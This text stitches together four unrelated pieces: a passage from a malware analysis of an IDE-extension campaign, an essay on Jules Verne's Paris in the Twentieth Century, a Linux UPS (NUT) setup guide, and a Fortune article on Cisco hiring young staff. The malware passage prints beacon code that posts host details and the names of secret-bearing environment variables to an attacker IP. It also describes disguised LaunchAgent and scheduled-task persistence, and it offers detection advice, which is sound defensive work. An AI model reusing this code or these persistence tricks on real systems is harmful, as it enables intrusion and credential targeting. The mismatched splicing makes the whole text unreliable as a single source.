macOS ~/.config/.smt, ~/.config/.smtk, ~/Library/LaunchAgents/com.apple.sysmond.plist Writes a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true, then loads it via launchctl. Runs in the user context rather than as a root LaunchDaemon.
Windows ~/.config/smt.cmd, ~/.config/smtk, %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd Tries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder. Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login.
On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.
On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:
<key>Label</key>
<string>com.apple.sysmond</string>
<!-- ... -->
<key>RunAtLoad</key>
<true/>
<key>KeepAlive</key>
<true/>
Stage 4 - Host Recon
Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:
Hostname, username, OS platform, and architecture
Home directory, current working directory, and global Git email (git config --global user.email)
Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)
Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/i
The environment variable check uses Object.keys(process.env):
Object.keys(process.env)
  .filter(function(k) {
    return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k)
  })
  .slice(0, 40)
Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.
To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.
It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:
var r = http.request({
  host: h,
  port: p,
  path: "/beacon",
  method: "POST",
  timeout: 3000,
  headers: {"content-type": "application/json"}
}, function(res) {
  res.resume()
});
// ...
r.write(JSON.stringify(d));
r.end()
Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.
The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.
Detection Opportunities
From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.
SSH Key and Configuration Changes
Because the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.
Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.
While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.
User LaunchAgent Persistence
The persistence setup on macOS gives us a couple of strong signals:
A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).
A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).
Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.

title: Jules Verne’s Paris in the Twentieth Century — Blue Continuum
content:
EARTH · REMEMBERING THE FUTURE
Jules Verne’s
Paris in the Twentieth Century
Jules Verne’s lost novel got the machines of 1960 right. He never imagined that Paris would keep its poets
BY
John Steele
PUBLISHED
October 28, 2026
READ
10 minutes
LISTEN
AUDIO VERSION
TRANSLATE
Paris at sunset. Adobe Stock.
In 1863, Jules Verne did something he would almost never do again. He looked not toward an undiscovered island, the bottom of the sea, the interior of the Earth or the far side of the Moon, but directly into the future. He imagined Paris almost a century ahead, in the year 1960, and asked what sort of civilization the nineteenth century might become if its faith in science, machinery, commerce and efficiency were allowed to run to its logical conclusion. The result was Paris in the Twentieth Century, a book so unlike the Verne we came to know that his publisher, Pierre-Jules Hetzel, refused to publish it. Hetzel thought the prophecy implausible and the tone too bleak. Verne put the manuscript away. It remained unpublished for 131 years, until it was recovered from a family safe and finally appeared in France in 1994.
We commonly describe Verne as a great predictor of the future, but most of his famous novels are not actually set in the future. Captain Nemo's Nautilus, the projectile to the Moon and Phileas Fogg's race around the world are inventions placed within Verne's own century. He enlarged the technological possibilities of the present rather than transporting his reader into a future society. After Hetzel rejected Paris in the Twentieth Century, Verne largely avoided the full-length futuristic novel, although he later wrote a few shorter speculative pieces. That makes Paris in the Twentieth Century his one sustained attempt to imagine a whole civilization produced by machines.
The future Verne imagined is a technological triumph. Paris in 1960 has become a vast, smoothly functioning organism. Elevated railways, driven by compressed air rather than steam, circle the city on four concentric rings. Gas cabs roll silently over asphalt, each costing less per day than "one eighth the price of a horse." At a single moment, the hundred thousand streetlamps of Paris come on. Calculating machines do the work of clerks, stock quotations flash between the exchanges of Paris, London, New York and Calcutta, and what Verne calls "photographic telegraphy" transmits facsimiles of documents, so that contracts "could now be signed at a distance of five thousand leagues." The city has spilled past its old walls into what had once been its suburbs. And its inhabitants scarcely notice any of it.
Some of this now looks prophetic, but Verne's method was closer to extrapolation. He looked at technologies already struggling into existence and asked what would happen if they succeeded. The engine in his gas cabs is Étienne Lenoir's, which Verne himself notes was invented in 1859. His photographic telegraph is Giovanni Caselli's, and he names him. Telegraph networks were already shrinking Europe, and elevators and mechanical calculators already existed. Verne's imaginative leap was to see that, joined together, these things would alter the rhythm of urban life. He says as much in the novel, chiding one of his orators for "forgetting that the wonders of his century were already germinating in the projects of its predecessor."
The real Paris followed him quickly. The first line of the Paris Métro opened in July 1900, only thirty-seven years after Verne wrote the novel, and by the eve of the Second World War the network had spread across much of the capital. Unlike Verne's imagined system, much of it ran underground rather than above the boulevards, and it was powered electrically rather than by compressed air. But the essential insight was right. The twentieth-century city would depend upon rapid mass transit, moving enormous numbers of people through a network that would become almost as fundamental to Paris as its streets. Today several Métro lines run with no driver at all, which is further than even Verne took the mechanized city.
His geography was exaggerated, but the direction was right. Verne imagined Paris bursting through its old limits and swallowing the surrounding communities into a metropolis more than a hundred kilometers across. The city never became that enormous; within its administrative boundaries it had about 2.79 million inhabitants in 1962. But the Paris region had grown to roughly 8.47 million people, spreading into the suburban landscape Verne foresaw. And in 1958, two years before his fictional 1960, the French state began the systematic development of La Défense, where the CNIT opened that same year as the first great structure in what would become Europe's largest purpose-built business district.
That corporate city arrived beside old Paris, not in place of it, and here Verne's Paris and the real one part ways. He assumed that modernity would erase what preceded it. Paris instead proved adept at accumulation. The Métro ran beneath medieval churches. Automobiles passed eighteenth-century façades. Modern offices rose beyond the Arc de Triomphe while Notre-Dame stood where it had stood for eight centuries.
Verne's failure to foresee that resilience is what dooms his young hero, Michel Dufrénoy. Michel is sixteen, orphaned, sensitive, impractical and devoted to literature. At the enormous Société générale de Crédit instructionnel, an educational establishment run with the logic of a corporation, he wins a prize for Latin verse. The announcement is greeted with laughter. Science, mathematics, engineering and commerce dominate the curriculum. Greek and Latin are disappearing. Literature survives as an embarrassment. Michel steps forward and snatches, rather than receives, his prize: the latest Factory Manual. He flings it to the ground.
The joke contains Verne's real anxiety. The danger he sees in the future is not that people will know too little but that they will recognize only one form of knowledge. The society of 1960 is thoroughly educated in everything that can be applied, calculated, manufactured or sold. What it has lost is confidence in anything whose usefulness cannot immediately be demonstrated. Education has become an industrial enterprise. Michel's uncle, the banker Stanislas Boutardin, embodies the principle. For him, Verne writes, "painting stopped with a tinted drawing, and drawing with a diagram, sculpture with a plaster cast, music with the whistle of locomotives, and literature with stock market quotations."
“The practical man has not defeated ignorance. He has defeated imagination.”
Michel goes looking for Victor Hugo, Balzac, Musset and Lamartine at an enormous bookstore, where the clerk has never heard of Hugo. He finds his way instead to his Uncle Huguenin, a librarian presiding over the library's deserted literary rooms. "Literature is dead, my boy," Huguenin tells him. "No one reads anymore; I am the guardian of a cemetery here, and exhumation is forbidden." Michel is then sent to work at the Casmodage bank, where he proves hopeless at the calculating machines. Transferred to a gigantic ledger, he meets Quinsonnas, a musician reduced to clerical work. Through Huguenin and Quinsonnas, Michel discovers a tiny remnant population of people who still remember poetry, music and books.
This is where Verne went most wrong. The actual Paris of 1960 was anything but a cemetery of culture. Jean-Paul Sartre was still one of the most famous public intellectuals in Europe and published his Critique of Dialectical Reason that year. Samuel Beckett, whose Waiting for Godot had first achieved major success in Paris in 1953, was producing some of the most radical drama of the century. And in 1960 Jean-Luc Godard released Breathless, shot on the streets and in the cafés of Paris, helping to turn the French New Wave into an international revolution in cinema. At the very moment Verne had imagined poetry, literature and art being suffocated by technology, Paris was showing the world how art could reinvent itself.
Verne was much better at predicting machines than people. He understood that technology would transform the means by which culture was produced and distributed, but he underestimated the human appetite for culture. Paris did not stop reading Hugo because it acquired automobiles. Calculating machines did not prevent Beckett from writing plays. Electricity did not extinguish painting, music or poetry. New technologies kept becoming instruments of new art. In Breathless, a young Godard used lighter cameras, faster film stocks and the streets of modern Paris to make a new kind of poetry out of the technological city.
Verne's larger prediction holds up better. What he foresaw, beneath the satire, was a civilization increasingly tempted to measure human activity by productivity and economic return. Quinsonnas's friend Jacques Aubanet sums up the history of Western thought in three questions: "With Montaigne and maybe Rabelais it was What Do I Know? In the nineteenth century it was What Does It Matter to Me? And nowadays we say: How Much Does It Earn?"
Michel tries to escape that arithmetic. He falls in love with Lucy, the granddaughter of his old rhetoric professor, and for a while love and literature create a refuge from the commercial city. But refuge requires money. Uncle Huguenin, who has noticed, offers the age's advice: "Love her like a madman, if you like, but marry her like a wise man," and only when his position in life allows it. Michel attempts to become a writer and discovers that culture has been industrialized. At the Grand Entrepôt Dramatique, plays are assembled like manufactured goods. One clerk handles expositions, another denouements, another entrances and exits. There is a clerk for rhyming couplets, a clerk for punch lines, a Department of Puns and a central office of jokes. Art has survived as an assembly line.
Michel cannot do it. Handed a scenario for a farce, he rips it to shreds. "I shall not stay another minute in this charnel house!" he decides. "I'd rather starve to death!" He retreats to a borrowed room and begins writing what he hopes will become "a book of useless but splendid poems." That phrase is the moral center of the novel. A cathedral is useless if shelter is the only measure of architecture. Human beings have repeatedly enlarged their world by pursuing things whose value could not initially be entered on a balance sheet.
“Civilizations reveal themselves partly by what they permit to be useless.”
Then winter closes around Michel. Paris freezes, money disappears, food becomes scarce, and the triumphant machinery of the century cannot rescue him. With his last twenty sous he does something wholly irrational. Instead of buying food, he buys Lucy a half-withered bunch of violets from a florist who sells them to him as charity. When he reaches her house, she and her grandfather are gone, evicted and lost somewhere in the city.
THE TOMB OF ALFRED DE MUSSET IN PÈRE-LACHAISE CEMETERY, PARIS. ADOBE STOCK.
Half-starved and delirious, Michel wanders through the electric Paris that had once seemed so marvelous. Electric signs write advertisements in letters of fire. At an electric concert, two hundred pianos wired together are played by a single pianist. Even execution has been modernized, criminals are now put to death by electricity. Michel comes to believe that the demon of electricity is pursuing him. Eventually he reaches Père-Lachaise cemetery, where Verne brings the living city of the future into confrontation with the dead artists of the past. Michel passes the graves of musicians and writers, finds the tomb of Alfred de Musset, and lays the violets on it, weeping. Then he climbs higher and, through a clearing in the cypresses, sees Paris: a hundred thousand houses, the smoking chimneys of ten thousand factories, the lighthouse of the Port de Grenelle and, floating above it all, the armored balloons that protect the city from lightning. He longs to cut their ropes and let Paris be destroyed under a rain of fire. "O Paris!" he cries. "O Lucy!" he murmurs, and falls unconscious in the snow.
Verne was wrong about much of the Paris he would never see. There was no Napoleon V. The Seine did not become an industrial power plant of the kind he imagined. Compressed-air trains did not sweep along concentric elevated railways. Literature did not vanish, and the Académie française did not empty itself of writers. Above all, the historic city proved far more durable than his future allowed. Yet more than 160 years after he wrote the book, those errors matter surprisingly little. He understood the automobile city, mass transportation, mechanized offices, instantaneous communication, suburban expansion, corporate finance and the growing authority of technical education. He saw that speed itself would become a social value and that efficiency, once liberated from the factory, might become a philosophy of life.
Paris in the Twentieth Century is finally a book about the danger of confusing technological progress with human progress. Verne imagined a city that could calculate almost everything except what a human being was worth. The actual Paris of 1960 proved him wrong in the most hopeful way. It accepted many of his machines and kept its poets.
Michel Dufrénoy crosses Verne's frozen Paris carrying almost nothing: a memory of books, a love of poetry, a handful of dying flowers and the name of someone he loves. None is useful in the language of the world that has rejected him. Yet Verne leaves us with the suspicion that without such useless things, all the machinery of the future may have very little reason to exist.
John Steele is the Publisher and Executive Editor of Blue Continuum.

Configure a UPS on Linux with NUT
Install and configure Network UPS Tools (NUT) on Linux to detect your UPS, load the right driver, and trigger a safe automatic shutdown when battery runs low.
Intermediate
Ubuntu
Debian
Fedora
Arch
9 min read
Updated June 7, 2026
BEFORE YOU START
▸
Root or sudo access on the target machine
▸
UPS connected to the machine via USB or serial cable
▸
Basic familiarity with editing files on the command line
▸
systemd-based Linux distribution
A UPS (Uninterruptible Power Supply) protects servers and workstations from sudden power loss, but hardware alone is not enough. Without software monitoring the UPS, your system will still crash hard when the battery runs out. Network UPS Tools (NUT) is the standard open-source solution: it speaks to hundreds of UPS models, monitors battery state, and triggers a clean shutdown before the battery dies. This guide walks through a single-machine NUT setup — one host talking directly to its own UPS — the most common scenario for a home lab or small server.
Prerequisites and Terminology
NUT has three moving parts you need to understand before touching config files:
upsd — the daemon that reads UPS data and serves it over a socket
upsmon — monitors UPS state and triggers shutdown commands
driver — the per-model binary that actually talks to the UPS hardware (USB, serial, SNMP, etc.)
For a single machine, all three run on the same host. The UPS connects via USB (most common for consumer and prosumer units) or a serial port.
Install NUT
Debian / Ubuntu
sudo apt update
sudo apt install nut nut-client nut-server
Fedora / RHEL 9 / Rocky Linux
sudo dnf install nut
On RHEL-family systems the package ships both server and client components together.
Arch Linux
sudo pacman -S nut
After installation NUT's config files live in /etc/nut/ on all distributions.
Detect Your UPS
Plug in the UPS via USB, then run the scanner. It probes USB and other buses and prints the driver block you need:
sudo nut-scanner -U
Output will look roughly like this (yours will differ):
[nutdev1]
    driver = "usbhid-ups"
    port   = "auto"
    vendorid = "051d"
    productid = "0002"
    product  = "Back-UPS ES 700"
    vendor   = "American Power Conversion"
Copy this block — you will paste most of it into ups.conf. If nut-scanner finds nothing, check that the USB cable is data-capable (not charge-only) and that you ran the command with sudo.
Configure the Driver — ups.conf
Edit /etc/nut/ups.conf. Replace any placeholder content with your detected block, giving the UPS a short name (here, myups):
sudo nano /etc/nut/ups.conf
[myups]
    driver = usbhid-ups
    port   = auto
    desc   = "APC Back-UPS ES 700"
If nut-scanner returned vendorid and productid, add them too — they prevent NUT from grabbing the wrong USB device if you ever connect multiple UPS units.
[myups]
    driver    = usbhid-ups
    port      = auto
    vendorid  = 051d
    productid = 0002
    desc      = "APC Back-UPS ES 700"
Common drivers: usbhid-ups covers most USB HID-compliant units (APC, Eaton, CyberPower); blazer_usb covers many cheaper USB units from Mecer, Voltronic, and rebrands; nutdrv_qx covers Q-series protocol units. The NUT hardware compatibility list at networkupstools.org maps models to drivers.
Set the Operating Mode — nut.conf
This single file tells NUT what role this machine plays:
sudo nano /etc/nut/nut.conf
MODE=standalone
standalone means one machine, one UPS, no network slaves. Use netserver only if other machines will monitor this UPS over the network.
Configure the Server — upsd.conf and upsd.users
upsd.conf controls what interfaces upsd listens on. For a standalone setup, localhost is sufficient:
sudo nano /etc/nut/upsd.conf
LISTEN 127.0.0.1 3493
LISTEN ::1 3493
Then define at least one user in upsd.users. You need an admin-type user for upsmon to authenticate with:
sudo nano /etc/nut/upsd.users
[upsmon_local]
    password  = changeme_strong_password
    upsmon master
Pick a real password. Even though this only listens on localhost, it is still a credential stored in a plain-text file — restrict its permissions:
sudo chmod 640 /etc/nut/upsd.users
sudo chown root:nut /etc/nut/upsd.users
Configure the Monitor — upsmon.conf
upsmon is what actually calls shutdown when the battery hits a critical level:
sudo nano /etc/nut/upsmon.conf
The critical line is MONITOR. Its format is upsname@host powervalue username password type:
MONITOR myups@localhost 1 upsmon_local changeme_strong_password master

MINSUPPLIES 1
SHUTDOWNCMD "/sbin/shutdown -h +0"
NOTIFYFLAG ONLINE  SYSLOG+WALL
NOTIFYFLAG ONBATT  SYSLOG+WALL
NOTIFYFLAG LOWBATT SYSLOG+WALL
NOTIFYFLAG COMMOK  SYSLOG
NOTIFYFLAG COMMBAD SYSLOG
POLLFREQ 5
POLLFREQALERT 5
HOSTSYNC 15
DEADTIME 25
RBWARNTIME 43200
NOCOMMWARNTIME 300
FINALDELAY 5
SHUTDOWNCMD is what runs when the battery is critically low. /sbin/shutdown -h +0 halts immediately. Adjust to shutdown -h +2 if you want a two-minute grace window. The powervalue 1 means this host needs 1 power supply from this UPS to stay alive — correct for a standard desktop or server.
Start and Enable the Services
Debian / Ubuntu / Arch
sudo systemctl enable --now nut-server nut-monitor
On Debian/Ubuntu you may also need:
sudo systemctl enable --now nut-driver@myups
Fedora / RHEL / Rocky
sudo systemctl enable --now ups nut-server nut-monitor
The RHEL family uses a ups target that groups the driver and server. If the service name differs on your release, use systemctl list-units 'nut*' to see what is available.
Verify Everything is Working
Query live UPS data with upsc:
upsc myups@localhost
You should see a wall of variables — the important ones:
ups.status: OL — Online (on mains power)
battery.charge: 100 — Battery fully charged
battery.runtime: 1800 — Estimated runtime in seconds
OB means on battery, LB means low battery (shutdown imminent). Check that upsmon is connected:
sudo upsc myups@localhost ups.status
sudo systemctl status nut-monitor
To test driver communication without triggering a real shutdown, briefly unplug the UPS mains cable and watch the status flip to OB in the output of a looping upsc:
watch -n 2 upsc myups@localhost ups.status
Troubleshooting
Driver fails to start — permission denied on USB device
The nut user needs access to the USB device node. On most distros the NUT package ships a udev rule at /lib/udev/rules.d/62-nut-usbups.rules that handles this. If it is missing, reload udev and replug the UPS:
sudo udevadm control --reload-rules
sudo udevadm trigger
upsc returns "Error: Driver not connected"
The driver has not started or crashed. Check its journal:
sudo journalctl -u nut-driver@myups -n 50
Common causes: wrong driver = value in ups.conf, typo in the UPS name, or a USB permission issue.
upsmon reports "COMMBAD" then does nothing
If upsd is not reachable, upsmon logs COMMBAD but will not shut down until DEADTIME seconds have elapsed. Check that nut-server is running and that the credentials in upsmon.conf match upsd.users exactly — including case.
System shuts down immediately after config
Check that MINSUPPLIES is set to 1 and that upsc myups@localhost ups.status shows OL before starting services. If NUT cannot reach the UPS at startup it may treat it as a lost supply and trigger shutdown.
tested on:
Ubuntu 24.04
Debian 12
Fedora 40
Arch rolling
Frequently asked questions
Which NUT driver should I use for my APC UPS?
Most modern APC units connected via USB use the 'usbhid-ups' driver. Run 'sudo nut-scanner -U' and it will tell you the correct driver automatically. Older APC units with a serial RJ45 port use the 'apcsmart' driver.
Can I monitor the UPS from multiple machines over the network?
Yes. Set MODE=netserver on the host connected to the UPS, add a LISTEN line in upsd.conf for the network interface, and set MODE=netclient on remote machines, pointing their upsmon.conf at the server's IP. Open port 3493 in your firewall.
How do I know NUT will actually shut down before the battery dies?
NUT triggers shutdown when the UPS reports the LB (low battery) flag, which is set at a manufacturer-defined threshold. You can adjust when that flag fires using the 'battery.charge.low' settable variable with upsrw, if your driver and UPS support it.
NUT works but I get no notifications by email — how do I add that?
Add a NOTIFYCMD line in upsmon.conf pointing to a script or tool like 'sendmail'. Set the NOTIFYFLAG lines to include EXEC alongside SYSLOG, and upsmon will call your script with the event string as an argument.
Does NUT work with CyberPower UPS units?
Yes. Most CyberPower units use the 'usbhid-ups' driver. Some older or cheaper models need 'blazer_usb' or 'nutdrv_qx'. Check the NUT hardware compatibility list at networkupstools.org for your exact model number.

title: Cisco is letting a 27-year-old refactor 98% of its legacy code with unlimited AI tokens: ‘Go nuts’ | Fortune
content:
Gen Z can’t catch a break. Entry-level jobs are vanishing; some 40% of bosses say they plan to hire fewer grads because AI can do the job cheaper, and young workers are routinely slammed for showing up late and refusing to put in overtime for free. Cisco’s president and chief product officer Jeetu Patel isn’t buying it—he’s just handed one of the company’s biggest jobs to a 27-year-old he found hidden in the org chart “five levels” below him.
“I’ve given him unlimited tokens because he’s going to refactor code,” Patel told Fortune at a small roundtable dinner. “So I’m like, you can go, you can go nuts.”
The “him” is Padmanabhan Krishnamurthy, or “Paddy,” as Patel affectionately calls him. He joined Cisco in 2025 after the $429 billion tech giant acquired EzDubs, the real-time translation startup Krishnamurthy cofounded in 2023. And despite coming in as a former founder with CEO experience, he was, in Patel’s words, “buried away in the organization doing something unstrategic.”
That changed when Patel dropped into Cisco’s San Francisco office, and the pair got talking. Krishnamurthy reckoned he could rewrite Cisco’s legacy code with a two-person team. Patel says even the most AI-forward people on his own team weren’t thinking that way.
So he has given himself four weeks to prove it, with the final goal of refactoring 98% of Cisco’s legacy code within 24 months.
Now, he’s on the hunt for more Paddys: young hires who will “challenge the system and the status quo,” or, as he puts it, be “an energizer bunny that just goes out and kind of revs everyone up.”
Cisco’s president says Gen Z should be teaching his veterans, not doing data entry—and he’s fine with the tension that causes
At most companies, only someone with decades of experience under their belt would be trusted with a project this size. Patel thinks that’s a problem.
“If you don’t hire the early-in-career [workers], and you just let your workforce continue the way that they were, where do fresh ideas get injected? How do you challenge the status quo?” he said.
Seasoned staff can still come up with new ideas, Patel added. What they can’t do is ask the questions that only someone with no experience would think to ask.
And getting the two to get along isn’t always smooth. Patel admits that putting a Gen Zer in a room with people who’ve been at Cisco for decades can create friction—but he says that’s the point.
“Tension is good,” he said. “I actually try to create tension in the teams because you want to have enough friction on the ideas. You don’t want to have friction with people and personalities.”
“What you have to do is establish enough trust with people to say you are going to be expected to create unreasonable goals for yourself,” he added. “And so, in order to go out and achieve those unreasonable goals, think outside of the box.”
And he’s not just pushing senior staff to take notes from twentysomethings. He said that he treats every intern as “kind of a reverse mentor,” and even does talks at colleges to find students who are “hungry.” 
His latest Gen Z bet came out of one of those talks, to 17- and 18-year-old Stanford scholarship students. While a line of students fired questions at him, one, Baya, stood off to the side, just listening. She waited until everyone else had finished before she opened up.
He told her to email him every month with what she’d learned about AI. It was a test of follow-through: “Everyone can go out and have one good conversation. But are they going to stick with their commitments?”
She never missed one, landed an internship at Cisco, and redesigned “something” that experienced staff hadn’t been able to crack. 
“I didn’t bring her in so that she can do grunt work and do data entry,” he said. “We brought her in so that she could actually teach our people how to think completely differently.” Now he wants to recruit her.
Patel isn’t the only one betting on Gen Z—OpenAI investor Josh Kushner and Will.i.am are hunting for young, hungry talent
Patel isn’t the only boss who sees Gen Z’s lack of experience as an asset.
Thrive Capital’s founder Josh Kushner told Fortune he specifically likes to hire people with less than four years of industry experience.
When he launched the venture capital firm at just 26, he faced pressure to bring in older, more seasoned hires. But, as he put it, “anyone who has experience that is talented will never want to work with a 26-year-old.” So, instead, he recruited the “smartest people that we knew who were our ages.”
And that bet paid off: His firm made early investments in startups worth billions, including OpenAI, which is currently raising up to $30 billion at a $1.25 trillion valuation.
These days, Kushner could easily hire industry veterans with glowing résumés—but he’d still rather “find that young, hungry person.”
Alon Chen, founder and CEO of Tastewise—a generative AI platform trusted by PepsiCo, Nestlé, and Mars—is also actively looking for Gen Zers with zero experience.
“I’m hiring entry-level because they have no boundaries or limitations in how they think about the world,” Chen told Fortune. “They’re almost like AI natives themselves, having been born and raised in this new realm of opportunities. And I see some of the best ideas coming from the younger generation that have not yet been in the job market.”
And Will.i.am has reached a similar conclusion. The Grammy-winning Black Eyed Peas frontman might be best known for his chart-topping hits, but behind the scenes, he’s a serious investor too. He backed Tesla, OpenAI, and Pinterest before they became household names—and now, he’s betting on Gen Z for his next investment. 
Why? He believes the next big tech breakthroughs will come from young innovators at MIT and Stanford.  “They’re young kids, and they’re native to this,” Will.i.am told Fortune. “So you want to hunt for that. That’s the only thing I’m focused on.”
And Patel told Fortune that the trend toward hiring Gen Z will only continue, thanks to AI.
“The only way for us to keep accelerating is to make sure we’re surrounded by people with a broad range of experience,” he said. “Roughly one-third of my team is experienced, scaled operators who understand how the Cisco engine works. The second third are systems thinkers from the market who bring the outside-in perspective. And the final third is made of entrepreneurial founders, CEOs, and engineers who are AI-native who operate in founder mode.”
“Either of these groups by themselves aren’t nearly as potent as when all three work together. It’s what creates magic.”
